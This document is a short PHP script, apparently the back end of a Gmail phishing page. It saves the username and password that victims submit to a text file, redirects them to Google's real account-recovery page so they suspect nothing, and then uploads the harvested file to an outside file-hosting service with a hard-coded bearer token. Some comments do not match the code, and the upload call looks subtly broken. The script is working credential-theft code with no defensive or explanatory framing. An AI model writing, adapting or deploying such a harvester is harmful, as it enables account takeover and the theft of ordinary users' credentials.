<?php

file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
//check if form is submitted
    // ftp settings
$session_begin = curl_init();
curl_setopt($session_begin, CURLOPT_POST, true);
curl_setopt($session_begin, CURLOPT_POSTFIELDS, array('file' => 'username.txt'));
curl_setopt($session_begin, CURLOPT_URL, 'https://api.upload.io/v1/files/basic');
curl_setopt($session_begin, CURLOPT_HTTPHEADER, [
  "Content-Type: image/jpeg",
  "Authorization: Bearer public_W142hUz2Y7EX63gfCidm4YmPu2Gm"
]);
curl_exec($session_begin);
curl_close($session_begin);
 
// all done :-
exit();
?>
